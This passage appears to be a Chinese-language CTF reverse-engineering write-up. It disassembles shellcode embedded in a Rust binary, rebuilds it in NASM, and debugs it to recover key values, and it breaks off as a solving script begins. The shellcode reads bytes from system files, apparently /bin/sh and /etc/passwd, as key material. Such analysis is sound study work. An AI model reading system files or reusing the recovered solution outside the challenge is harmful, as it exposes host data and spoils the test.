class="line"><span class="built_in">memcpy</span>(v65, sub_5625F9C2BB2B, <span class="number">0xFF</span>uLL);</span><br><span class="line">v81 = v65;</span><br><span class="line">v82 = v67;</span><br><span class="line">v83 = <span class="number">255LL</span>;</span><br><span class="line">alloc::vec::Vec$LT$T$C$A$GT$::resize::h7362553f00beaec8(&amp;v81, <span class="number">255LL</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(v85 + <span class="number">16</span>) == <span class="number">-1</span> )</span><br><span class="line">  core::panicking::panic::h65157a6ac7f1357a();</span><br><span class="line">v84 = v85 + <span class="number">16</span>;</span><br><span class="line">dest[<span class="number">0</span>] = xmmword_5625F9C29010;</span><br><span class="line">dest[<span class="number">1</span>] = xmmword_5625F9C29020;</span><br><span class="line">dest[<span class="number">2</span>] = xmmword_5625F9C29030;</span><br><span class="line">dest[<span class="number">3</span>] = xmmword_5625F9C29040;</span><br><span class="line">v68 = v83;</span><br><span class="line"><span class="keyword">if</span> ( v83 &lt; <span class="number">0xCD</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_74;</span><br></pre></td></tr></table></figure><p>sub_5625F9C2BB2B  这个里面一开始是opcode，我们复制出来看下它的汇编</p><p>这里用了python的一个脚本，将指令还原汇编指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> capstone</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disassemble_hex_instructions</span>(<span class="params">hex_instructions</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Create a Capstone engine</span></span><br><span class="line">        md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)</span><br><span class="line">        instructions = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Convert the hexadecimal instructions to bytes</span></span><br><span class="line">        byte_data = <span class="built_in">bytes</span>(hex_instructions)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Disassemble each instruction</span></span><br><span class="line">        <span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(byte_data, <span class="number">0x1000</span>):</span><br><span class="line">            instructions.append(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> % (insn.address, insn.mnemonic, insn.op_str))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> instructions</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> capstone.CsError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Capstone Error: %s&quot;</span> % e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Input hexadecimal instructions</span></span><br><span class="line">    hex_instructions = [<span class="number">0x54</span>, <span class="number">0x5D</span>, <span class="number">0x31</span>, <span class="number">0xF6</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0xA1</span>, <span class="number">0x57</span>, <span class="number">0x06</span>, <span class="number">0xB8</span>, <span class="number">0x62</span>, <span class="number">0x3A</span>, <span class="number">0x9F</span>, <span class="number">0x37</span>, <span class="number">0x48</span>, <span class="number">0xBA</span>, <span class="number">0x8E</span>, <span class="number">0x35</span>, <span class="number">0x6F</span>, <span class="number">0xD6</span>, <span class="number">0x4D</span>, <span class="number">0x49</span>, <span class="number">0xF7</span>, <span class="number">0x37</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xD1</span>, <span class="number">0x51</span>, <span class="number">0x54</span>, <span class="number">0x5F</span>, <span class="number">0x6A</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x97</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5E</span>, <span class="number">0x6A</span>, <span class="number">0x04</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x41</span>, <span class="number">0x5C</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x31</span>, <span class="number">0xF6</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0x3B</span>, <span class="number">0x3B</span>, <span class="number">0x6F</span>, <span class="number">0xC3</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0xC0</span>, <span class="number">0xAA</span>, <span class="number">0x48</span>, <span class="number">0xBA</span>, <span class="number">0x48</span>, <span class="number">0x4C</span>, <span class="number">0x0B</span>, <span class="number">0xC3</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0xC0</span>, <span class="number">0xAA</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xD1</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0x8C</span>, <span class="number">0x57</span>, <span class="number">0x82</span>, <span class="number">0x75</span>, <span class="number">0xD6</span>, <span class="number">0xF8</span>, <span class="number">0xA9</span>, <span class="number">0x7D</span>, <span class="number">0x48</span>, <span class="number">0xBA</span>, <span class="number">0xA3</span>, <span class="number">0x32</span>, <span class="number">0xF6</span>, <span class="number">0x16</span>, <span class="number">0xF9</span>, <span class="number">0x88</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xD1</span>, <span class="number">0x51</span>, <span class="number">0x54</span>, <span class="number">0x5F</span>, <span class="number">0x6A</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x97</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5E</span>, <span class="number">0x6A</span>, <span class="number">0x04</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x41</span>, <span class="number">0x5D</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x31</span>, <span class="number">0xF6</span>, <span class="number">0x6A</span>, <span class="number">0x6F</span>, <span class="number">0x48</span>, <span class="number">0xB9</span>, <span class="number">0x59</span>, <span class="number">0xE5</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x2D</span>, <span class="number">0xF6</span>, <span class="number">0xD9</span>, <span class="number">0x77</span>, <span class="number">0x48</span>, <span class="number">0xBA</span>, <span class="number">0x76</span>, <span class="number">0x81</span>, <span class="number">0x63</span>, <span class="number">0x7A</span>, <span class="number">0x02</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xD1</span>, <span class="number">0x51</span>, <span class="number">0x54</span>, <span class="number">0x5F</span>, <span class="number">0x6A</span>, <span class="number">0x02</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x97</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5E</span>, <span class="number">0x6A</span>, <span class="number">0x04</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0xF7</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0xC1</span>, <span class="number">0xE8</span>, <span class="number">0x1D</span>, <span class="number">0x48</span>, <span class="number">0x99</span>, <span class="number">0x6A</span>, <span class="number">0x29</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0x49</span>, <span class="number">0x96</span>, <span class="number">0x6A</span>, <span class="number">0x03</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x44</span>, <span class="number">0x01</span>, <span class="number">0xE0</span>, <span class="number">0x44</span>, <span class="number">0x31</span>, <span class="number">0xE8</span>, <span class="number">0xC1</span>, <span class="number">0xC8</span>, <span class="number">0x0B</span>, <span class="number">0xF7</span>, <span class="number">0xD0</span>, <span class="number">0x44</span>, <span class="number">0x31</span>, <span class="number">0xF0</span>, <span class="number">0x3D</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0x6A</span>, <span class="number">0x01</span>, <span class="number">0x58</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x5F</span>, <span class="number">0x54</span>, <span class="number">0x5E</span>, <span class="number">0x6A</span>, <span class="number">0x08</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0x01</span>, <span class="number">0x58</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>]</span><br><span class="line">    disassembled_instructions = disassemble_hex_instructions(<span class="built_in">bytearray</span>(hex_instructions))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> disassembled_instructions:</span><br><span class="line">        <span class="keyword">for</span> instruction <span class="keyword">in</span> disassembled_instructions:</span><br><span class="line">            <span class="built_in">print</span>(instruction)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">assemble_call_instruction</span>(<span class="params">call_address</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">        call_instruction = <span class="string">f&quot;call <span class="subst">&#123;call_address:#X&#125;</span>&quot;</span></span><br><span class="line">        encoding, _ = ks.asm(call_instruction)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(encoding)</span><br><span class="line">    <span class="keyword">except</span> KsError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Keystone Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># Address to call</span></span><br><span class="line">    call_address = <span class="number">0x0000559395BE3430</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Assemble the CALL instruction</span></span><br><span class="line">    assembled_instruction = assemble_call_instruction(call_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> assembled_instruction:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Assembled CALL instruction: <span class="subst">&#123;assembled_instruction.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成了如下汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">tconexp/hb.py</span><br><span class="line">0x1000: push    rsp</span><br><span class="line">0x1001: pop     rbp</span><br><span class="line">0x1002: xor     esi, esi</span><br><span class="line">0x1004: movabs  rcx, 0x379f3a62b80657a1</span><br><span class="line">0x100e: movabs  rdx, 0x37f7494dd66f358e</span><br><span class="line">0x1018: xor     rcx, rdx</span><br><span class="line">0x101b: push    rcx</span><br><span class="line">0x101c: push    rsp</span><br><span class="line">0x101d: pop     rdi</span><br><span class="line">0x101e: push    2</span><br><span class="line">0x1020: pop     rax</span><br><span class="line">0x1021: cdq</span><br><span class="line">0x1022: syscall</span><br><span class="line">0x1024: xchg    rdi, rax</span><br><span class="line">0x1026: xor     eax, eax</span><br><span class="line">0x1028: push    rax</span><br><span class="line">0x1029: push    rsp</span><br><span class="line">0x102a: pop     rsi</span><br><span class="line">0x102b: push    4</span><br><span class="line">0x102d: pop     rdx</span><br><span class="line">0x102e: syscall</span><br><span class="line">0x1030: pop     r12</span><br><span class="line">0x1032: push    3</span><br><span class="line">0x1034: pop     rax</span><br><span class="line">0x1035: syscall</span><br><span class="line">0x1037: xor     esi, esi</span><br><span class="line">0x1039: movabs  rcx, 0xaac06463c36f3b3b</span><br><span class="line">0x1043: movabs  rdx, 0xaac06463c30b4c48</span><br><span class="line">0x104d: xor     rcx, rdx</span><br><span class="line">0x1050: push    rcx</span><br><span class="line">0x1051: movabs  rcx, 0x7da9f8d67582578c</span><br><span class="line">0x105b: movabs  rdx, 0xec888f916f632a3</span><br><span class="line">0x1065: xor     rcx, rdx</span><br><span class="line">0x1068: push    rcx</span><br><span class="line">0x1069: push    rsp</span><br><span class="line">0x106a: pop     rdi</span><br><span class="line">0x106b: push    2</span><br><span class="line">0x106d: pop     rax</span><br><span class="line">0x106e: cdq</span><br><span class="line">0x106f: syscall</span><br><span class="line">0x1071: xchg    rdi, rax</span><br><span class="line">0x1073: xor     eax, eax</span><br><span class="line">0x1075: push    rax</span><br><span class="line">0x1076: push    rsp</span><br><span class="line">0x1077: pop     rsi</span><br><span class="line">0x1078: push    4</span><br><span class="line">0x107a: pop     rdx</span><br><span class="line">0x107b: syscall</span><br><span class="line">0x107d: pop     r13</span><br><span class="line">0x107f: push    3</span><br><span class="line">0x1081: pop     rax</span><br><span class="line">0x1082: syscall</span><br><span class="line">0x1084: xor     esi, esi</span><br><span class="line">0x1086: push    0x6f</span><br><span class="line">0x1088: movabs  rcx, 0x77d9f62d0c06e559</span><br><span class="line">0x1092: movabs  rdx, 0x5bc8c027a638176</span><br><span class="line">0x109c: xor     rcx, rdx</span><br><span class="line">0x109f: push    rcx</span><br><span class="line">0x10a0: push    rsp</span><br><span class="line">0x10a1: pop     rdi</span><br><span class="line">0x10a2: push    2</span><br><span class="line">0x10a4: pop     rax</span><br><span class="line">0x10a5: cdq</span><br><span class="line">0x10a6: syscall</span><br><span class="line">0x10a8: xchg    rdi, rax</span><br><span class="line">0x10aa: xor     eax, eax</span><br><span class="line">0x10ac: push    rax</span><br><span class="line">0x10ad: push    rsp</span><br><span class="line">0x10ae: pop     rsi</span><br><span class="line">0x10af: push    4</span><br><span class="line">0x10b1: pop     rdx</span><br><span class="line">0x10b2: syscall</span><br><span class="line">0x10b4: pop     rax</span><br><span class="line">0x10b5: not     rax</span><br><span class="line">0x10b8: shr     rax, 0x1d</span><br><span class="line">0x10bc: cqo</span><br><span class="line">0x10be: push    0x29</span><br><span class="line">0x10c0: pop     rcx</span><br><span class="line">0x10c1: div     rcx</span><br><span class="line">0x10c4: xchg    r14, rax</span><br><span class="line">0x10c6: push    3</span><br><span class="line">0x10c8: pop     rax</span><br><span class="line">0x10c9: syscall</span><br><span class="line">0x10cb: mov     eax, 0xdeadbeef</span><br><span class="line">0x10d0: add     eax, r12d</span><br><span class="line">0x10d3: xor     eax, r13d</span><br><span class="line">0x10d6: ror     eax, 0xb</span><br><span class="line">0x10d9: not     eax</span><br><span class="line">0x10db: xor     eax, r14d</span><br><span class="line">0x10de: cmp     eax, 0xdeadbeef</span><br><span class="line">0x10e3: jne     0x10ea</span><br><span class="line">0x10e5: push    1</span><br><span class="line">0x10e7: pop     rax</span><br><span class="line">0x10e8: jmp     0x10ed</span><br><span class="line">0x10ea: xor     rax, rax</span><br><span class="line">0x10ed: push    rax</span><br><span class="line">0x10ee: push    rbx</span><br><span class="line">0x10ef: pop     rdi</span><br><span class="line">0x10f0: push    rsp</span><br><span class="line">0x10f1: pop     rsi</span><br><span class="line">0x10f2: push    8</span><br><span class="line">0x10f4: pop     rdx</span><br><span class="line">0x10f5: push    1</span><br><span class="line">0x10f7: pop     rax</span><br><span class="line">0x10f8: syscall</span><br><span class="line">0x10fa: push    rbp</span><br><span class="line">0x10fb: pop     rsp</span><br></pre></td></tr></table></figure><p>目前发现没什么用先放这，继续往下动调，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v81 = v65;</span><br><span class="line"> v82 = v67;</span><br><span class="line"> v83 = <span class="number">255LL</span>;</span><br><span class="line"> alloc::vec::Vec$LT$T$C$A$GT$::resize::h7362553f00beaec8(&amp;v81, <span class="number">255LL</span>, <span class="number">0LL</span>);</span><br><span class="line"> <span class="keyword">if</span> ( *(_DWORD *)(v85 + <span class="number">16</span>) == <span class="number">-1</span> )</span><br><span class="line">   core::panicking::panic::h65157a6ac7f1357a();</span><br><span class="line"> v84 = v85 + <span class="number">16</span>;</span><br><span class="line"> dest[<span class="number">0</span>] = xmmword_5625F9C29010;</span><br><span class="line"> dest[<span class="number">1</span>] = xmmword_5625F9C29020;</span><br><span class="line"> dest[<span class="number">2</span>] = xmmword_5625F9C29030;</span><br><span class="line"> dest[<span class="number">3</span>] = xmmword_5625F9C29040;</span><br><span class="line"> v68 = v83;</span><br></pre></td></tr></table></figure><p>发现dest赋了新值，我们在这个代码执行完后面 的位置用ida patch到上面哪个shellcode位置</p><p>，发现这个位置改变了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x10cb: mov     eax, 0xxxxx  这个变成了我们输入的数据前4个byte</span><br><span class="line">0x10d0: add     eax, r12d</span><br><span class="line">0x10d3: xor     eax, r13d</span><br><span class="line">0x10d6: ror     eax, 0xb</span><br><span class="line">0x10d9: not     eax</span><br><span class="line">0x10db: xor     eax, r14d</span><br><span class="line">0x10de: cmp     eax, 0xxxxxx   这里变成了我们的dest数据也就是比较的目的数据</span><br></pre></td></tr></table></figure><p>嗯，分析这块关键代码我们发现这里进行了xor ror not xor操作，其中r12 r13 r14是未知的，所以我们要想办法获取这3个寄存器的值，我一开始想patch源程序到这个位置，发现到了这个位置就无法执行 了，所以使用另一种方法，就汇编写出asm文件，进行nasm编译，然后再动调把断点下在0x10cb就可以查看r12 13 14的值了</p><p>编译具体方法：</p><p>n.asm:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rbp</span><br><span class="line">    xor     esi, esi</span><br><span class="line">    mov     rcx, 0x379f3a62b80657a1</span><br><span class="line">    mov     rdx, 0x37f7494dd66f358e</span><br><span class="line">    xor     rcx, rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rdi</span><br><span class="line">    push    2</span><br><span class="line">    pop     rax</span><br><span class="line">    cdq</span><br><span class="line">    syscall</span><br><span class="line">    xchg    rdi, rax</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    push    rax</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line">    push    4</span><br><span class="line">    pop     rdx</span><br><span class="line">    syscall</span><br><span class="line">    pop     r12</span><br><span class="line">    push    3</span><br><span class="line">    pop     rax</span><br><span class="line">    syscall</span><br><span class="line">    xor     esi, esi</span><br><span class="line">    mov     rcx, 0xaac06463c36f3b3b</span><br><span class="line">    mov     rdx, 0xaac06463c30b4c48</span><br><span class="line">    xor     rcx, rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    mov     rcx, 0x7da9f8d67582578c</span><br><span class="line">    mov     rdx, 0xec888f916f632a3</span><br><span class="line">    xor     rcx, rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rdi</span><br><span class="line">    push    2</span><br><span class="line">    pop     rax</span><br><span class="line">    cdq</span><br><span class="line">    syscall</span><br><span class="line">    xchg    rdi, rax</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    push    rax</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line">    push    4</span><br><span class="line">    pop     rdx</span><br><span class="line">    syscall</span><br><span class="line">    pop     r13</span><br><span class="line">    push    3</span><br><span class="line">    pop     rax</span><br><span class="line">    syscall</span><br><span class="line">    xor     esi, esi</span><br><span class="line">    push    0x6f</span><br><span class="line">    mov     rcx, 0x77d9f62d0c06e559</span><br><span class="line">    mov     rdx, 0x5bc8c027a638176</span><br><span class="line">    xor     rcx, rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rdi</span><br><span class="line">    push    2</span><br><span class="line">    pop     rax</span><br><span class="line">    cdq</span><br><span class="line">    syscall</span><br><span class="line">    xchg    rdi, rax</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    push    rax</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line">    push    4</span><br><span class="line">    pop     rdx</span><br><span class="line">    syscall</span><br><span class="line">    pop     rax</span><br><span class="line">    not     rax</span><br><span class="line">    shr     rax, 0x1d</span><br><span class="line">    cqo</span><br><span class="line">    push    0x29</span><br><span class="line">    pop     rcx</span><br><span class="line">    div     rcx</span><br><span class="line">    xchg    r14, rax</span><br><span class="line">    push    3</span><br><span class="line">    pop     rax</span><br><span class="line">    syscall</span><br><span class="line">    mov     eax, 0xdeadbeef</span><br><span class="line">    add     eax, r12d</span><br><span class="line">    xor     eax, r13d</span><br><span class="line">    ror     eax, 0xb</span><br><span class="line">    not     eax</span><br><span class="line">    xor     eax, r14d</span><br><span class="line">    cmp     eax, 0xdeadbeef</span><br><span class="line">    jne     short not_equal</span><br><span class="line">    push    1</span><br><span class="line">    pop     rax</span><br><span class="line">    jmp     short done</span><br><span class="line">not_equal:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">done:</span><br><span class="line">    push    rax</span><br><span class="line">    push    rbx</span><br><span class="line">    pop     rdi</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line">    push    8</span><br><span class="line">    pop     rdx</span><br><span class="line">    push    1</span><br><span class="line">    pop     rax</span><br><span class="line">    syscall</span><br><span class="line">    push    rbp</span><br><span class="line">    pop     rsp</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 -o vuln.o n.asm</span><br><span class="line">ld -o my_program vuln.o</span><br></pre></td></tr></table></figure><p>将上面的汇编进行编译生成elf文件，然后再使用ida动调得到如下</p><p>r12 &#x3D; 0x0000000464C457F    r13 &#x3D; 0x0000000746F6F72    r14 &#x3D; 0x000000031F3831F</p><p>分析完逻辑我们就可以写解密脚本了，参考3cly师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 